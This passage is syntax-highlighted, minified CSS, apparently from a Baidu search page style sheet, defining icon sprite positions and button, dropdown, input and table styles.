class="variable">.c-icon-chevron-bottom</span>&#123;background-position:-72px -168px&#125;\n<span class="variable">.c-icon-chevron-top</span>&#123;background-position:-96px -168px&#125;\n<span class="variable">.c-icon-unfold</span>&#123;background-position:-120px -168px&#125;\n<span class="variable">.c-icon-fold</span>&#123;background-position:-144px -168px&#125;\n<span class="variable">.c-icon-chevron-unfold</span>&#123;background-position:-168px -168px&#125;\n<span class="variable">.c-icon-qa</span>&#123;background-position:-192px -168px&#125;\n<span class="variable">.c-icon-register</span>&#123;background-position:-216px -168px&#125;\n<span class="variable">.c-icon-star</span>&#123;background-position:-240px -168px&#125;\n<span class="variable">.c-icon-star-gray</span>&#123;position:relative&#125;\n<span class="variable">.c-icon-star-gray</span> <span class="variable">.c-icon-star</span>&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">left</span>:0&#125;\n<span class="variable">.c-icon-play-blue</span>&#123;background-position:-312px -168px&#125;\n<span class="variable">.c-icon-pic</span>&#123;width:16px;<span class="attribute">background-position</span>:-336px -168px&#125;\n<span class="variable">.c-icon-chevron-fold</span>&#123;background-position:-360px -168px&#125;\n<span class="variable">.c-icon-video</span>&#123;width:18px;<span class="attribute">background-position</span>:-384px -168px&#125;\n<span class="variable">.c-icon-circle-blue</span>&#123;background-position:-408px -168px&#125;\n<span class="variable">.c-icon-circle-yellow</span>&#123;background-position:-432px -168px&#125;\n<span class="variable">.c-icon-play-white</span>&#123;background-position:-456px -168px&#125;\n<span class="variable">.c-icon-triangle-down-blue</span>&#123;background-position:-480px -168px&#125;\n<span class="variable">.c-icon-chevron-unfold</span>2&#123;background-position:-504px -168px&#125;\n<span class="variable">.c-icon-right</span>&#123;background-position:-528px -168px&#125;\n<span class="variable">.c-icon-right-empty</span>&#123;background-position:-552px -168px&#125;\n<span class="variable">.c-icon-new-corner</span>&#123;width:15px;<span class="attribute">background-position</span>:-576px -168px&#125;\n<span class="variable">.c-icon-horn</span>&#123;background-position:-600px -168px&#125;\n<span class="variable">.c-icon-right-large</span>&#123;width:18px;<span class="attribute">background-position</span>:-624px -168px&#125;\n<span class="variable">.c-icon-wrong-large</span>&#123;background-position:-648px -168px&#125;\n<span class="variable">.c-icon-circle-blue-s</span>&#123;background-position:-672px -168px&#125;\n<span class="variable">.c-icon-play-gray</span>&#123;background-position:-696px -168px&#125;\n<span class="variable">.c-icon-up</span>&#123;background-position:-720px -168px&#125;\n<span class="variable">.c-icon-down</span>&#123;background-position:-744px -168px&#125;\n<span class="variable">.c-icon-stable</span>&#123;background-position:-768px -168px&#125;\n<span class="variable">.c-icon-calendar-blue</span>&#123;background-position:-792px -168px&#125;\n<span class="variable">.c-icon-triangle-down-blue</span>2&#123;background-position:-816px -168px&#125;\n<span class="variable">.c-icon-triangle-up-blue</span>2&#123;background-position:-840px -168px&#125;\n<span class="variable">.c-icon-down-blue</span>&#123;background-position:-864px -168px&#125;\n<span class="variable">.c-icon-up-blue</span>&#123;background-position:-888px -168px&#125;\n<span class="variable">.c-icon-ting</span>&#123;background-position:-912px -168px&#125;\n<span class="variable">.c-icon-piao</span>&#123;background-position:-936px -168px&#125;\n<span class="variable">.c-icon-wrong-empty</span>&#123;background-position:-960px -168px&#125;\n<span class="variable">.c-icon-warning-circle-s</span>&#123;background-position:-984px -168px&#125;\n<span class="variable">.c-icon-chevron-left</span>&#123;background-position:-1008px -168px&#125;\n<span class="variable">.c-icon-chevron-right</span>&#123;background-position:-1032px -168px&#125;\n<span class="variable">.c-icon-circle-gray-s</span>&#123;background-position:-1056px -168px&#125;\n<span class="variable">.c-icon-v</span>,<span class="variable">.c-icon-v-noborder</span>&#123;background-position:0 -192px&#125;\n<span class="variable">.c-icon-hui</span>&#123;background-position:-24px -192px&#125;\n<span class="variable">.c-icon-bao</span>&#123;background-position:-48px -192px&#125;\n<span class="variable">.c-icon-phone</span>&#123;background-position:-72px -192px&#125;\n<span class="variable">.c-icon-qa-empty</span>&#123;background-position:-96px -192px&#125;\n<span class="variable">.c-icon-safeguard</span>&#123;background-position:-120px -192px&#125;\n<span class="variable">.c-icon-register-empty</span>&#123;background-position:-144px -192px&#125;\n<span class="variable">.c-icon-zan</span>&#123;background-position:-168px -192px&#125;\n<span class="variable">.c-icon-music</span>&#123;background-position:-192px -192px&#125;\n<span class="variable">.c-icon-music-gray</span>&#123;background-position:-216px -192px&#125;\n<span class="variable">.c-icon-location</span>&#123;background-position:-240px -192px&#125;\n<span class="variable">.c-icon-warning</span>&#123;background-position:-264px -192px&#125;\n<span class="variable">.c-icon-doc</span>&#123;background-position:-288px -192px&#125;\n<span class="variable">.c-icon-xls</span>&#123;background-position:-312px -192px&#125;\n<span class="variable">.c-icon-ppt</span>&#123;background-position:-336px -192px&#125;\n<span class="variable">.c-icon-pdf</span>&#123;background-position:-360px -192px&#125;\n<span class="variable">.c-icon-txt</span>&#123;background-position:-384px -192px&#125;\n<span class="variable">.c-icon-play-black</span>&#123;background-position:-408px -192px&#125;\n<span class="variable">.c-icon-play-black</span>:hover&#123;background-position:-432px -192px&#125;\n<span class="variable">.c-icon-gift</span>&#123;background-position:-456px -192px&#125;\n<span class="variable">.c-icon-baidu-share</span>&#123;background-position:-480px -192px&#125;\n<span class="variable">.c-icon-bear</span>&#123;background-position:-504px -192px&#125;\n<span class="variable">.c-icon-R</span>&#123;background-position:-528px -192px&#125;\n<span class="variable">.c-icon-bear-border</span>&#123;background-position:-576px -192px&#125;\n<span class="variable">.c-icon-person</span>,<span class="variable">.c-icon-person-noborder</span>&#123;background-position:-600px -192px&#125;\n<span class="variable">.c-icon-location-blue</span>&#123;background-position:-624px -192px&#125;\n<span class="variable">.c-icon-hotAirBall</span>&#123;background-position:-648px -192px&#125;\n<span class="variable">.c-icon-moon</span>&#123;background-position:-672px -192px&#125;\n<span class="variable">.c-icon-streetMap</span>&#123;background-position:-696px -192px&#125;\n<span class="variable">.c-icon-high-v</span>,<span class="variable">.c-icon-high-v-noborder</span>&#123;background-position:-720px -192px&#125;\n<span class="variable">.c-icon-nuo</span>&#123;background-position:-744px -192px&#125;\n<span class="variable">.c-icon-mv</span>&#123;background-position:-768px -192px&#125;\n<span class="variable">.c-icon-fan</span>&#123;background-position:-792px -192px&#125;\n<span class="variable">.c-icon-med</span>&#123;background-position:-816px -192px&#125;\n<span class="variable">.c-icon-air</span>&#123;background-position:-840px -192px&#125;\n<span class="variable">.c-icon-share</span>2&#123;background-position:-864px -192px&#125;\n<span class="variable">.c-icon-v</span>1,<span class="variable">.c-icon-v</span>1-noborder&#123;background-position:-888px -192px&#125;\n<span class="variable">.c-icon-v</span>2,<span class="variable">.c-icon-v</span>2-noborder&#123;background-position:-912px -192px&#125;\n<span class="variable">.c-icon-v</span>3,<span class="variable">.c-icon-v</span>3-noborder&#123;background-position:-936px -192px&#125;\n<span class="variable">.c-icon-v</span>1-noborder-disable&#123;background-position:-960px -192px&#125;\n<span class="variable">.c-icon-v</span>2-noborder-disable&#123;background-position:-984px -192px&#125;\n<span class="variable">.c-icon-v</span>3-noborder-disable&#123;background-position:-1008px -192px&#125;\n<span class="variable">.c-icon-write</span>&#123;background-position:-1032px -192px&#125;\n<span class="variable">.c-icon-zhidao-s</span>&#123;background-position:-1056px -192px&#125;\n<span class="variable">.c-icon-shopping</span>&#123;background-position:-1080px -192px&#125;\n<span class="variable">.c-icon-bear-circle</span>&#123;background-position:0 -216px&#125;\n<span class="variable">.c-icon-warning-circle</span>&#123;background-position:-24px -216px&#125;\n<span class="variable">.c-icon-warning-triangle</span>&#123;width:24px;<span class="attribute">background-position</span>:-48px -216px&#125;\n<span class="variable">.c-icon-warning-circle-gray</span>&#123;background-position:-72px -216px&#125;\n<span class="variable">.c-icon-ball-red</span>&#123;background-position:0 -240px&#125;\n<span class="variable">.c-icon-ball-blue</span>&#123;background-position:-48px -240px&#125;\n<span class="variable">.c-icon-tieba</span>&#123;background-position:0 -288px&#125;\n<span class="variable">.c-icon-zhidao</span>&#123;background-position:-48px -288px&#125;\n<span class="variable">.c-icon-bear-p</span>&#123;background-position:-96px -288px&#125;\n<span class="variable">.c-icon-bear-pn</span>&#123;background-position:-144px -288px&#125;\n<span class="variable">.c-icon-download</span>&#123;background-position:0 -336px&#125;\n<span class="variable">.c-icon-lyric</span>&#123;background-position:-24px -336px&#125;\n<span class="variable">.c-icon-play-circle</span>&#123;background-position:-48px -336px&#125;\n<span class="variable">.c-icon-play-circle</span>:hover&#123;background-position:-72px -336px&#125;\n<span class="variable">.c-icon-stop-circle</span>&#123;background-position:-96px -336px&#125;\n<span class="variable">.c-icon-stop-circle</span>:hover&#123;background-position:-120px -336px&#125;\n<span class="variable">.c-icon-play-circle-middle</span>&#123;background-position:0 -360px&#125;\n<span class="variable">.c-icon-play-circle-middle</span>:hover&#123;background-position:-48px -360px&#125;\n<span class="variable">.c-icon-stop-circle-middle</span>&#123;background-position:-96px -360px&#125;\n<span class="variable">.c-icon-stop-circle-middle</span>:hover&#123;background-position:-144px -360px&#125;\n<span class="variable">.c-icon-play-black-large</span>&#123;background-position:0 -408px&#125;\n<span class="variable">.c-icon-play-black-large</span>:hover&#123;background-position:-48px -408px&#125;\n<span class="variable">.c-icon-stop-black-large</span>&#123;background-position:-96px -408px&#125;\n<span class="variable">.c-icon-stop-black-large</span>:hover&#123;background-position:-144px -408px&#125;\n<span class="variable">.c-icon-play-black-larger</span>&#123;background-position:0 -456px&#125;\n<span class="variable">.c-icon-play-black-larger</span>:hover&#123;background-position:-72px -456px&#125;\n<span class="variable">.c-icon-stop-black-larger</span>&#123;background-position:-144px -456px&#125;\n<span class="variable">.c-icon-stop-black-larger</span>:hover&#123;background-position:-216px -456px&#125;\n<span class="variable">.c-recommend</span>&#123;font-size:0;<span class="attribute">padding</span>:5px 0;<span class="attribute">border</span>:1px solid #f3f3f3;<span class="attribute">border-left</span>:0;<span class="attribute">border-right</span>:0&#125;\n<span class="variable">.c-recommend</span> <span class="variable">.c-icon</span>&#123;margin-bottom:-4px&#125;\n<span class="variable">.c-recommend</span> <span class="variable">.c-gray</span>,<span class="variable">.c-recommend</span> a&#123;font-size:13px&#125;\n<span class="variable">.c-recommend-notopline</span>&#123;padding-top:0;<span class="attribute">border-top</span>:0&#125;\n<span class="variable">.c-recommend-vline</span>&#123;display:inline-block;<span class="attribute">margin</span>:0 10px -2px;<span class="attribute">border-left</span>:1px solid #d8d8d8;<span class="attribute">width</span>:0;<span class="attribute">height</span>:12px;<span class="attribute">_vertical-align</span>:middle;<span class="attribute">_overflow</span>:hidden&#125;\n<span class="variable">.c-text</span>&#123;display:inline-block;<span class="attribute">padding</span>:2px;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:text-bottom;<span class="attribute">font-size</span>:12px;<span class="attribute">line-height</span>:100%;<span class="attribute">font-style</span>:normal;<span class="attribute">font-weight</span>:400;<span class="attribute">color</span>:#fff;<span class="attribute">overflow</span>:hidden&#125;\na<span class="variable">.c-text</span>&#123;text-decoration:none&#125;\n<span class="variable">.c-text-new</span>&#123;background-color:#f13f40&#125;\n<span class="variable">.c-text-info</span>&#123;padding-left:0;<span class="attribute">padding-right</span>:0;<span class="attribute">font-weight</span>:700;<span class="attribute">color</span>:#2b99ff;*<span class="attribute">vertical-align</span>:baseline;<span class="attribute">_position</span>:relative;<span class="attribute">_top</span>:2px&#125;\n<span class="variable">.c-text-info</span> b&#123;_position:relative;<span class="attribute">_top</span>:-1px&#125;\n<span class="variable">.c-text-info</span> span&#123;padding:0 2px;<span class="attribute">font-weight</span>:400&#125;\n<span class="variable">.c-text-important</span>&#123;background-color:#1cb7fd&#125;\n<span class="variable">.c-text-public</span>&#123;background-color:#2b99ff&#125;\n<span class="variable">.c-text-warning</span>&#123;background-color:#ff830f&#125;\n<span class="variable">.c-text-prompt</span>&#123;background-color:#f5c537&#125;\n<span class="variable">.c-text-danger</span>&#123;background-color:#f13f40&#125;\n<span class="variable">.c-text-safe</span>&#123;background-color:#52c277&#125;\n<span class="variable">.c-text-empty</span>&#123;padding-top:1px;<span class="attribute">padding-bottom</span>:1px;<span class="attribute">border</span>:1px solid #d8d8d8;<span class="attribute">cursor</span>:pointer;<span class="attribute">color</span>:#23b9fd;<span class="attribute">background-color</span>:#fff&#125;\n<span class="variable">.c-text-empty</span>:hover&#123;border-color:#388bff&#125;\n<span class="variable">.c-text-empty</span>:active&#123;border-color:#a2a6ab;<span class="attribute">background-color</span>:#f0f0f0;<span class="attribute">box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px #c7c7c7&#125;\n<span class="variable">.c-text-mult</span>&#123;padding-left:5px;<span class="attribute">padding-right</span>:5px&#125;\n<span class="variable">.c-text-gray</span>&#123;background-color:#666&#125;\n<span class="variable">.c-btn</span>,<span class="variable">.c-btn</span>:visited&#123;color:#333!important&#125;\n<span class="variable">.c-btn</span>&#123;display:inline-block;<span class="attribute">padding</span>:0 14px;<span class="attribute">margin</span>:0;<span class="attribute">height</span>:24px;<span class="attribute">line-height</span>:25px;<span class="attribute">font-size</span>:13px;<span class="attribute">filter</span>:chroma(color=#000000);*<span class="attribute">zoom</span>:1;<span class="attribute">border</span>:1px solid #d8d8d8;<span class="attribute">cursor</span>:pointer;<span class="attribute">font-family</span>:inherit;<span class="attribute">font-weight</span>:400;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:middle;<span class="attribute">background-color</span>:#f9f9f9;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0&#125;\n<span class="variable">.c-btn</span>:hover&#123;border-color:#388bff&#125;\n<span class="variable">.c-btn</span>:active&#123;border-color:#a2a6ab;<span class="attribute">background-color</span>:#f0f0f0;<span class="attribute">box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px #c7c7c7&#125;\na<span class="variable">.c-btn</span>&#123;text-decoration:none&#125;\nbutton<span class="variable">.c-btn</span>&#123;height:26px;<span class="attribute">_line-height</span>:18px;*<span class="attribute">overflow</span>:visible&#125;\nbutton<span class="variable">.c-btn</span>::-moz-focus-inner&#123;padding:0;<span class="attribute">border</span>:0&#125;\n<span class="variable">.c-btn</span> <span class="variable">.c-icon</span>&#123;margin-top:5px&#125;\n<span class="variable">.c-btn-disable</span>&#123;color:#999!important&#125;\n<span class="variable">.c-btn-disable</span>:visited&#123;color:#999!important&#125;\n<span class="variable">.c-btn-disable</span>:hover&#123;border:1px solid #d8d8d8;<span class="attribute">cursor</span>:default&#125;\n<span class="variable">.c-btn-disable</span>:active&#123;border-color:#d8d8d8;<span class="attribute">background-color</span>:#f9f9f9;<span class="attribute">box-shadow</span>:none;<span class="attribute">-webkit-box-shadow</span>:none;<span class="attribute">-moz-box-shadow</span>:none;<span class="attribute">-o-box-shadow</span>:none&#125;\n<span class="variable">.c-btn-mini</span>&#123;padding-left:5px;<span class="attribute">padding-right</span>:5px;<span class="attribute">height</span>:18px;<span class="attribute">line-height</span>:18px;<span class="attribute">font-size</span>:12px&#125;\nbutton<span class="variable">.c-btn-mini</span>&#123;height:20px;<span class="attribute">_height</span>:18px;<span class="attribute">_line-height</span>:14px&#125;\n<span class="variable">.c-btn-mini</span> <span class="variable">.c-icon</span>&#123;margin-top:2px&#125;\n<span class="variable">.c-btn-large</span>&#123;height:28px;<span class="attribute">line-height</span>:28px;<span class="attribute">font-size</span>:14px;<span class="attribute">font-family</span>:\"\u5fae\u8f6f\u96c5\u9ed1\",\"\u9ed1\u4f53\"&#125;\nbutton<span class="variable">.c-btn-large</span>&#123;height:30px;<span class="attribute">_line-height</span>:24px&#125;\n<span class="variable">.c-btn-large</span> <span class="variable">.c-icon</span>&#123;margin-top:7px;<span class="attribute">_margin-top</span>:6px&#125;\n<span class="variable">.c-btn-primary</span>,<span class="variable">.c-btn-primary</span>:visited&#123;color:#fff!important&#125;\n<span class="variable">.c-btn-primary</span>&#123;background-color:#388bff;<span class="attribute">border-color</span>:#3c8dff #408ffe #3680e6&#125;\n<span class="variable">.c-btn-primary</span>:hover&#123;border-color:#2678ec #2575e7 #1c6fe2 #2677e7;<span class="attribute">background-color</span>:#388bff;<span class="attribute">background-image</span>:url(data:image\/png;<span class="attribute">base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAMAAACuX0YVAAAABlBMVEVnpv85i\/9PO5r4AAAAD0lEQVR42gEEAPv\/AAAAAQAFAAIros7PAAAAAElFTkSuQmCC);*background-image</span>:none;<span class="attribute">background-repeat</span>:repeat-x;<span class="attribute">box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-webkit-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-moz-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-o-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4)&#125;\n<span class="variable">.c-btn-primary</span>:active&#123;border-color:#178ee3 #1784d0 #177bbf #1780ca;<span class="attribute">background-color</span>:#388bff;<span class="attribute">background-image</span>:none;<span class="attribute">box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15);<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15);<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15);<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15)&#125;\n<span class="variable">.c-btn</span> <span class="variable">.c-icon</span>&#123;float:left&#125;\n<span class="variable">.c-dropdown</span>2&#123;position:relative;<span class="attribute">display</span>:inline-block;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:26px;<span class="attribute">line-height</span>:26px;<span class="attribute">font-size</span>:13px;<span class="attribute">vertical-align</span>:middle;<span class="attribute">outline</span>:0;<span class="attribute">_font-family</span>:SimSun;<span class="attribute">background-color</span>:#fff;<span class="attribute">word-wrap</span>:normal;<span class="attribute">word-break</span>:normal&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-btn-group&#123;position:relative;<span class="attribute">height</span>:24px;<span class="attribute">border</span>:1px solid #999;<span class="attribute">border-bottom-color</span>:#d8d8d8;<span class="attribute">border-right-color</span>:#d8d8d8;<span class="attribute">-moz-user-select</span>:none;<span class="attribute">-webkit-user-select</span>:none;<span class="attribute">user-select</span>:none&#125;\n<span class="variable">.c-dropdown</span>2-hover <span class="variable">.c-dropdown</span>2-btn-group,<span class="variable">.c-dropdown</span>2:hover <span class="variable">.c-dropdown</span>2-btn-group&#123;box-shadow:inset 1px 1px 0 0 #d8d8d8;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 0 0 #d8d8d8;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 0 0 #d8d8d8;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 0 0 #d8d8d8&#125;\n<span class="variable">.c-dropdown</span>2-hover <span class="variable">.c-dropdown</span>2-btn-icon,<span class="variable">.c-dropdown</span>2:hover <span class="variable">.c-dropdown</span>2-btn-icon&#123;box-shadow:inset 0 1px 0 0 #d8d8d8;<span class="attribute">-webkit-box-shadow</span>:inset 0 1px 0 0 #d8d8d8;<span class="attribute">-moz-box-shadow</span>:inset 0 1px 0 0 #d8d8d8;<span class="attribute">-o-box-shadow</span>:inset 0 1px 0 0 #d8d8d8&#125;\n<span class="variable">.c-dropdown</span>2-hover <span class="variable">.c-dropdown</span>2-btn-icon-border,<span class="variable">.c-dropdown</span>2:hover <span class="variable">.c-dropdown</span>2-btn-icon-border&#123;background-color:#f2f2f2&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-btn&#123;height:24px;<span class="attribute">padding-left</span>:10px;<span class="attribute">padding-right</span>:10px;<span class="attribute">cursor</span>:default;<span class="attribute">overflow</span>:hidden;<span class="attribute">white-space</span>:nowrap&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-btn-icon&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">right</span>:0;<span class="attribute">width</span>:23px;<span class="attribute">height</span>:24px;<span class="attribute">line-height</span>:24px;<span class="attribute">background-color</span>:#fff;<span class="attribute">padding</span>:0 1px 0 10px&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-btn-icon-border&#123;height:24px;<span class="attribute">width</span>:23px;<span class="attribute">border-left</span>:1px solid #d9d9d9;<span class="attribute">text-align</span>:center;<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-icon-triangle-down</span>&#123;*margin-top:5px;<span class="attribute">_margin-left</span>:2px&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-menu&#123;position:absolute;<span class="attribute">left</span>:0;<span class="attribute">top</span>:100%;<span class="attribute">_margin-top</span>:0;<span class="attribute">width</span>:100%;<span class="attribute">overflow</span>:hidden;<span class="attribute">border</span>:1px solid #bbb;<span class="attribute">background</span>:#fff;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-menu-inner&#123;overflow:hidden&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-option&#123;background-color:#fff;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.c-dropdown</span>2 <span class="variable">.c-dropdown</span>2-selected&#123;background-color:#f5f5f5&#125;\n<span class="variable">.c-dropdown</span>2-common li,<span class="variable">.c-dropdown</span>2-common ul&#123;margin:0;<span class="attribute">padding</span>:0;<span class="attribute">list-style</span>:none&#125;\n<span class="variable">.c-dropdown</span>2-common <span class="variable">.c-dropdown</span>2-option&#123;height:26px;<span class="attribute">line-height</span>:26px;<span class="attribute">font-size</span>:12px;<span class="attribute">color</span>:#333;<span class="attribute">white-space</span>:nowrap;<span class="attribute">cursor</span>:pointer;<span class="attribute">padding-left</span>:10px&#125;\n<span class="variable">.c-dropdown</span>2-common <span class="variable">.c-dropdown</span>2-selected&#123;background-color:#f5f5f5&#125;\n<span class="variable">.c-dropdown</span>2-common <span class="variable">.c-dropdown</span>2-menu-group <span class="variable">.c-dropdown</span>2-group&#123;padding-left:10px;<span class="attribute">font-weight</span>:700;<span class="attribute">cursor</span>:default&#125;\n<span class="variable">.c-dropdown</span>2-common <span class="variable">.c-dropdown</span>2-menu-group <span class="variable">.c-dropdown</span>2-option&#123;padding-left:20px&#125;\n<span class="variable">.c-img</span>&#123;display:block;<span class="attribute">min-height</span>:1px;<span class="attribute">border</span>:0 0&#125;\n<span class="variable">.c-img</span>3&#123;width:52px&#125;\n<span class="variable">.c-img</span>4&#123;width:75px&#125;\n<span class="variable">.c-img</span>6&#123;width:121px&#125;\n<span class="variable">.c-img</span>7&#123;width:144px&#125;\n<span class="variable">.c-img</span>12&#123;width:259px&#125;\n<span class="variable">.c-img</span>15&#123;width:328px&#125;\n<span class="variable">.c-img</span>18&#123;width:397px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-img</span>3&#123;width:56px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-img</span>4&#123;width:78px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-img</span>7&#123;width:144px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-img</span>12&#123;width:254px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-img</span>15&#123;width:320px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-img</span>18&#123;width:386px&#125;\n<span class="variable">.c-index</span>&#123;display:inline-block;<span class="attribute">padding</span>:1px 0;<span class="attribute">color</span>:#fff;<span class="attribute">width</span>:14px;<span class="attribute">line-height</span>:100%;<span class="attribute">font-size</span>:12px;<span class="attribute">text-align</span>:center;<span class="attribute">background-color</span>:#8eb9f5&#125;\n<span class="variable">.c-index-hot</span>,<span class="variable">.c-index-hot</span>1&#123;background-color:#f54545&#125;\n<span class="variable">.c-index-hot</span>2&#123;background-color:#ff8547&#125;\n<span class="variable">.c-index-hot</span>3&#123;background-color:#ffac38&#125;\n<span class="variable">.c-input</span>&#123;display:inline-block;<span class="attribute">padding</span>:0 4px;<span class="attribute">height</span>:24px;<span class="attribute">line-height</span>:24px\\9;<span class="attribute">font-size</span>:13px;<span class="attribute">border</span>:1px solid #999;<span class="attribute">border-bottom-color</span>:#d8d8d8;<span class="attribute">border-right-color</span>:#d8d8d8;<span class="attribute">outline</span>:0;<span class="attribute">box-sizing</span>:content-box;<span class="attribute">-webkit-box-sizing</span>:content-box;<span class="attribute">-moz-box-sizing</span>:content-box;<span class="attribute">vertical-align</span>:top;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.c-input</span>:hover&#123;box-shadow:inset 1px 1px 1px 0 #d8d8d8;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px 0 #d8d8d8;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px 0 #d8d8d8;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px 0 #d8d8d8&#125;\n<span class="variable">.c-input</span> <span class="variable">.c-icon</span>&#123;float:right;<span class="attribute">margin-top</span>:6px&#125;\n<span class="variable">.c-input</span> <span class="variable">.c-icon-left</span>&#123;float:left;<span class="attribute">margin-right</span>:4px&#125;\n<span class="variable">.c-input</span> input&#123;float:left;<span class="attribute">height</span>:22px;*<span class="attribute">padding-top</span>:4px;<span class="attribute">margin-top</span>:2px;<span class="attribute">font-size</span>:13px;<span class="attribute">border</span>:0;<span class="attribute">outline</span>:0&#125;\n<span class="variable">.c-input</span>&#123;width:180px&#125;\n<span class="variable">.c-input</span> input&#123;width:162px&#125;\n<span class="variable">.c-input-xmini</span>&#123;width:65px&#125;\n<span class="variable">.c-input-xmini</span> input&#123;width:47px&#125;\n<span class="variable">.c-input-mini</span>&#123;width:88px&#125;\n<span class="variable">.c-input-mini</span> input&#123;width:70px&#125;\n<span class="variable">.c-input-small</span>&#123;width:157px&#125;\n<span class="variable">.c-input-small</span> input&#123;width:139px&#125;\n<span class="variable">.c-input-large</span>&#123;width:203px&#125;\n<span class="variable">.c-input-large</span> input&#123;width:185px&#125;\n<span class="variable">.c-input-xlarge</span>&#123;width:341px&#125;\n<span class="variable">.c-input-xlarge</span> input&#123;width:323px&#125;\n<span class="variable">.c-input</span>12&#123;width:249px&#125;\n<span class="variable">.c-input</span>12 input&#123;width:231px&#125;\n<span class="variable">.c-input</span>20&#123;width:433px&#125;\n<span class="variable">.c-input</span>20 input&#123;width:415px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input</span>&#123;width:178px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input</span> input&#123;width:160px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-xmini</span>&#123;width:68px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-xmini</span> input&#123;width:50px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-mini</span>&#123;width:90px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-mini</span> input&#123;width:72px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-small</span>&#123;width:156px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-small</span> input&#123;width:138px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-large</span>&#123;width:200px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-large</span> input&#123;width:182px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-xlarge</span>&#123;width:332px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input-xlarge</span> input&#123;width:314px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input</span>12&#123;width:244px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input</span>12 input&#123;width:226px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input</span>20&#123;width:420px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-input</span>20 input&#123;width:402px&#125;\n<span class="variable">.c-numberset</span>&#123;*zoom:1&#125;\n<span class="variable">.c-numberset</span>:after&#123;display:block;<span class="attribute">height</span>:0;<span class="attribute">content</span>:\"\";<span class="attribute">clear</span>:both;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.c-numberset</span> li&#123;float:left;<span class="attribute">margin-right</span>:17px;<span class="attribute">list-style</span>:none&#125;\n<span class="variable">.c-numberset</span> <span class="variable">.c-numberset-last</span>&#123;margin-right:0&#125;\n<span class="variable">.c-numberset</span> a&#123;display:block;<span class="attribute">width</span>:50px;<span class="attribute">text-decoration</span>:none;<span class="attribute">text-align</span>:center;<span class="attribute">border</span>:1px solid #d8d8d8;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.c-numberset</span> a:hover&#123;border-color:#388bff&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-numberset</span> li&#123;margin-right:10px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-numberset</span> <span class="variable">.c-numberset-last</span>&#123;margin-right:0&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-numberset</span> a&#123;width:54px&#125;\n<span class="variable">.c-table</span>&#123;width:100%;<span class="attribute">border-collapse</span>:collapse;<span class="attribute">border-spacing</span>:0&#125;\n<span class="variable">.c-table</span> td,<span class="variable">.c-table</span> th&#123;padding-left:10px;<span class="attribute">line-height</span>:1.54;<span class="attribute">font-size</span>:13px;<span class="attribute">border-bottom</span>:1px solid #f3f3f3;<span 